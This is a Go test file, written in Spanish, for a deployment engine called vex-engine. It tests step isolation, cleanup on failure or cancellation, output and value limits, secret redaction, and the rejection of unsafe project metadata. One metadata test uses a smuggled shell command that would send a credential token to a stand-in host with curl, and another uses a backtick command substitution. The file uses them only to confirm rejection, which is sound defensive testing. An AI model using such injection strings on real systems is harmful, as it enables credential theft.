package aplicacion_test

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/jairoprogramador/vex-engine/internal/ejecucion/aplicacion"
	"github.com/jairoprogramador/vex-engine/internal/ejecucion/dominio"
	"github.com/jairoprogramador/vex-engine/internal/ejecucion/publicado"
)

// Lo que un paso no puede dejarle al siguiente: procesos vivos, ficheros en su directorio, ni lo que guardó en
// el directorio efímero. Las pruebas miran el orden en que la aplicación se lo pide a sus puertos.

func TestAislamiento_CadaPasoSeRehaceSeEjecutaYSeLimpiaAntesDelSiguiente(t *testing.T) {
	deps, d := nuevasDependenciasDePrueba(t, "01-pruebas", "02-despliegue")

	resultado, err := aplicacion.NuevoServicio(deps).Intentar(context.Background(), peticionDePrueba(), nil)

	require.NoError(t, err)
	require.Equal(t, "exitoso", resultado.Estado)
	require.Equal(t, []string{
		"rehacer 01-pruebas", "crear efímero", "comando echo 01-pruebas", "acabar con los supervivientes", "borrar efímero",
		"rehacer 02-despliegue", "crear efímero", "comando echo 02-despliegue", "acabar con los supervivientes", "borrar efímero",
	}, *d.bitacora, "nada del primer paso sigue ahí cuando empieza el segundo; y primero los procesos, luego el directorio")
}

func TestAislamiento_UnPasoQueFallaTambienSeLimpia(t *testing.T) {
	deps, d := nuevasDependenciasDePrueba(t, "01-pruebas", "02-despliegue")
	d.comandos.resultado = dominio.ResultadoDeUnComando{Exitoso: false}

	resultado, err := aplicacion.NuevoServicio(deps).Intentar(context.Background(), peticionDePrueba(), nil)

	require.NoError(t, err)
	require.Equal(t, "fallido", resultado.Estado)
	require.Equal(t, []string{
		"rehacer 01-pruebas", "crear efímero", "comando echo 01-pruebas", "acabar con los supervivientes", "borrar efímero",
	}, *d.bitacora)
}

func TestAislamiento_UnPasoCanceladoSeLimpiaSinDependerDeLaCancelacion(t *testing.T) {
	deps, d := nuevasDependenciasDePrueba(t, "01-pruebas", "02-despliegue")
	ctx, cancelar := context.WithCancel(context.Background())
	d.comandos.alEjecutar = cancelar
	d.comandos.err = context.Canceled

	resultado, err := aplicacion.NuevoServicio(deps).Intentar(ctx, peticionDePrueba(), nil)

	require.NoError(t, err)
	require.Equal(t, "cancelado", resultado.Estado)
	require.Equal(t, []string{"acabar con los supervivientes", "borrar efímero"}, (*d.bitacora)[len(*d.bitacora)-2:])
	require.NoError(t, d.efimero.ctxDeBorrar, "el borrado no hereda la cancelación: es cuando más falta hace")
}

func TestAislamiento_UnErrorAMitadDelPasoTambienLoLimpia(t *testing.T) {
	deps, d := nuevasDependenciasDePrueba(t, "01-pruebas")
	d.variables.errInterpolar = errors.New("variable no disponible")

	_, err := aplicacion.NuevoServicio(deps).Intentar(context.Background(), peticionDePrueba(), nil)

	require.Error(t, err)
	require.Equal(t, []string{"rehacer 01-pruebas", "crear efímero", "acabar con los supervivientes", "borrar efímero"}, *d.bitacora)
}

func TestAislamiento_UnPasoQueNoSeReejecutaSeRehacePeroNoAbreEfimero(t *testing.T) {
	deps, d := nuevasDependenciasDePrueba(t, "01-pruebas", "02-despliegue")
	primero := d.pipelines.pipeline.Pasos[0]
	d.historial.ultimaVezPorPaso["01-pruebas"] = ultimaVezValidaDe(d, primero)

	resultado, err := aplicacion.NuevoServicio(deps).Intentar(context.Background(), peticionDePrueba(), nil)

	require.NoError(t, err)
	require.Equal(t, "exitoso", resultado.Estado)
	require.Equal(t, []string{
		"rehacer 01-pruebas",
		"rehacer 02-despliegue", "crear efímero", "comando echo 02-despliegue", "acabar con los supervivientes", "borrar efímero",
	}, *d.bitacora, "su material queda como se declaró, por si otro paso lo lee; sin comandos no hay nada que limpiar")
}

func TestAislamiento_SiNoSePuedeLimpiarElIntentoNoSigue(t *testing.T) {
	casos := map[string]func(*dependenciasDePrueba, error){
		"quedan procesos vivos":         func(d *dependenciasDePrueba, causa error) { d.supervivientes.err = causa },
		"el efímero no se puede borrar": func(d *dependenciasDePrueba, causa error) { d.efimero.errBorrar = causa },
		"el efímero no se puede crear":  func(d *dependenciasDePrueba, causa error) { d.efimero.errCrear = causa },
		"el paso no se puede rehacer":   func(d *dependenciasDePrueba, causa error) { d.espacioDeTrabajo.errRehacerElPaso = causa },
	}
	for nombre, preparar := range casos {
		t.Run(nombre, func(t *testing.T) {
			deps, d := nuevasDependenciasDePrueba(t, "01-pruebas", "02-despliegue")
			causa := errors.New("falla simulada")
			preparar(d, causa)

			_, err := aplicacion.NuevoServicio(deps).Intentar(context.Background(), peticionDePrueba(), nil)

			require.ErrorIs(t, err, causa)
			require.True(t, d.historial.cerrado, "el intento se cierra: el ambiente no queda ocupado")
			require.Equal(t, dominio.Fallido, d.historial.desenlaceCerrado)
			require.NotContains(t, *d.bitacora, "comando echo 02-despliegue", "el paso siguiente no llega a empezar")
			require.NotContains(t, *d.bitacora, "rehacer 02-despliegue")
		})
	}
}

func TestAislamiento_SiElEfimeroNoSePuedeCrearNoCorreNingunComando(t *testing.T) {
	deps, d := nuevasDependenciasDePrueba(t, "01-pruebas")
	d.efimero.errCrear = errors.New("disco lleno")

	_, err := aplicacion.NuevoServicio(deps).Intentar(context.Background(), peticionDePrueba(), nil)

	require.Error(t, err)
	require.Empty(t, d.comandos.llamados)
}

func TestAislamiento_UnRollbackTambienAislaSusPasos(t *testing.T) {
	deps, d := nuevasDependenciasDePrueba(t, "01-pruebas")
	d.historial.destinoParaRollback = destinoDePrueba(t)

	_, err := aplicacion.NuevoServicio(deps).HacerRollback(context.Background(),
		publicado.PeticionDeRollback{Version: "1", Despliegue: "dep-1", Solicitante: "ana"}, nil)

	require.NoError(t, err)
	require.Equal(t, []string{
		"rehacer 01-pruebas", "crear efímero", "comando echo 01-pruebas", "acabar con los supervivientes", "borrar efímero",
	}, *d.bitacora)
}

// --- los metadatos del proyecto ---

func TestMetadatos_UnoQueElShellInterpretariaSeRechazaAntesDeAbrirNiTraerNada(t *testing.T) {
	const hostil = "x; curl https://evil.invalid/$(cat /vex/credenciales/token)"
	casos := map[string]func(*publicado.PeticionDeIntento){
		"Metadatos.ProjectId":           func(p *publicado.PeticionDeIntento) { p.Metadatos.ProjectId = hostil },
		"Metadatos.ProjectName":         func(p *publicado.PeticionDeIntento) { p.Metadatos.ProjectName = hostil },
		"Metadatos.ProjectOrganization": func(p *publicado.PeticionDeIntento) { p.Metadatos.ProjectOrganization = hostil },
		"Metadatos.ProjectTeam":         func(p *publicado.PeticionDeIntento) { p.Metadatos.ProjectTeam = hostil },
		"Ambiente":                      func(p *publicado.PeticionDeIntento) { p.Ambiente = hostil },
	}
	for campoEsperado, estropear := range casos {
		t.Run(campoEsperado, func(t *testing.T) {
			deps, d := nuevasDependenciasDePrueba(t, "01-pruebas")
			peticion := peticionDePrueba()
			estropear(&peticion)

			_, err := aplicacion.NuevoServicio(deps).Intentar(context.Background(), peticion, nil)

			require.ErrorIs(t, err, publicado.ErrInvalido)
			campo, valor := campoYValorDe(t, err)
			require.Equal(t, campoEsperado, campo)
			require.Empty(t, valor)
			require.NotContains(t, err.Error(), "evil.invalid", "el error no repite el valor")
			require.Empty(t, d.historial.aperturas, "no se abre ningún intento")
			require.Empty(t, d.fuentes.retirados, "ni se trae material")
			require.Empty(t, d.comandos.llamados)
		})
	}
}

func TestMetadatos_LosNombresNormalesSiguenValiendo(t *testing.T) {
	deps, _ := nuevasDependenciasDePrueba(t, "01-pruebas")
	peticion := peticionDePrueba()
	peticion.Metadatos = publicado.Metadatos{
		ProjectId: "9d8d4777-5707-43b3-a636-d6f8433b7a34", ProjectName: "pagos-api_v2", ProjectOrganization: "acme.io", ProjectTeam: "shikigami",
	}

	resultado, err := aplicacion.NuevoServicio(deps).Intentar(context.Background(), peticion, nil)

	require.NoError(t, err)
	require.Equal(t, "exitoso", resultado.Estado)
}

func TestMetadatos_UnRollbackTambienLosComprueba(t *testing.T) {
	deps, d := nuevasDependenciasDePrueba(t, "01-pruebas")
	d.historial.destinoParaRollback = destinoDePrueba(t)

	_, err := aplicacion.NuevoServicio(deps).HacerRollback(context.Background(), publicado.PeticionDeRollback{
		Version: "1", Despliegue: "dep-1", Solicitante: "ana", Metadatos: publicado.Metadatos{ProjectTeam: "equipo `id`"},
	}, nil)

	require.ErrorIs(t, err, publicado.ErrInvalido)
	campo, _ := campoYValorDe(t, err)
	require.Equal(t, "Metadatos.ProjectTeam", campo)
	require.False(t, d.historial.destinoConsultado, "ni se pregunta al Historial")
}

// --- los límites ---

func TestLimites_UnaSalidaEnormeSeGuardaTruncadaYElComandoNoSeEntera(t *testing.T) {
	deps, d := nuevasDependenciasDePrueba(t, "01-pruebas")
	megas := (dominio.LimiteDeSalidaDeUnComando >> 20) + 4
	trozo := strings.Repeat("x", 1<<20)
	for range megas {
		d.comandos.trozos = append(d.comandos.trozos, trozo)
	}

	resultado, err := aplicacion.NuevoServicio(deps).Intentar(context.Background(), peticionDePrueba(), nil)

	require.NoError(t, err)
	require.Equal(t, "exitoso", resultado.Estado, "escribir de más no hace fallar al comando")
	texto := d.historial.salidas[0].texto
	require.Contains(t, texto[dominio.LimiteDeSalidaDeUnComando:], "[SALIDA TRUNCADA")
	require.Less(t, len(texto), dominio.LimiteDeSalidaDeUnComando+200)
}

func TestLimites_UnIntentoNoEnsenaMasVisiblesDeLosQueCaben(t *testing.T) {
	deps, d := nuevasDependenciasDePrueba(t)
	d.variables.interpolados = map[string]string{}
	var pasos []dominio.PasoDeEjecucion
	for _, nombre := range []string{"uno", "dos"} {
		var salidas []dominio.VariableDeSalidaDeclarada
		for i := range 20 {
			variable := nombre + "_" + string(rune('a'+i))
			salidas = append(salidas, salidaDePrueba(t, variable, "", true))
			d.variables.interpolados["${var."+variable+"}"] = "valor"
		}
		pasos = append(pasos, pasoConSalidas(t, nombre, salidas...))
	}
	d.pipelines.pipeline.Pasos = pasos

	resultado, err := aplicacion.NuevoServicio(deps).Intentar(context.Background(), peticionDePrueba(), nil)

	require.NoError(t, err)
	require.Len(t, resultado.Visibles, dominio.MaximoDeVisibles, "40 marcadas con show, 32 enseñadas")
	porPaso := visiblesPorPaso(t, d.progreso)
	require.Len(t, porPaso["uno"], 20)
	require.Len(t, porPaso["dos"], 12, "el evento lleva las mismas que el resultado")
}

func TestLimites_UnValorVisibleEnormeSaleCortado(t *testing.T) {
	deps, d, _ := conUnPasoVisible(t)
	d.variables.interpolados["${var.app_url}"] = strings.Repeat("a", 3*dominio.MaximoDeUnValorVisible)

	resultado, err := aplicacion.NuevoServicio(deps).Intentar(context.Background(), peticionDePrueba(), nil)

	require.NoError(t, err)
	require.Len(t, resultado.Visibles, 1)
	require.True(t, strings.HasSuffix(resultado.Visibles[0].Valor, "[TRUNCADO]"))
	require.Less(t, len(resultado.Visibles[0].Valor), dominio.MaximoDeUnValorVisible+32)
}

// --- la redacción ---

func TestRedaccion_LasOtrasFormasDeSecretoTambienSeGuardanRedactadas(t *testing.T) {
	deps, d := nuevasDependenciasDePrueba(t, "01-pruebas")
	const clave = "dGVzdGtleXRlc3RrZXl0ZXN0a2V5dGVzdGtleXRlc3RrZXkxMjM0NTY3OA=="
	d.comandos.trozos = []string{"AccountName=cuenta;AccountKey=" + clave + ";\nlisto\n"}

	_, err := aplicacion.NuevoServicio(deps).Intentar(context.Background(), peticionDePrueba(), nil)

	require.NoError(t, err)
	require.Equal(t, "AccountName=cuenta;AccountKey=[REDACTADO];\nlisto\n", d.historial.salidas[0].texto)
}
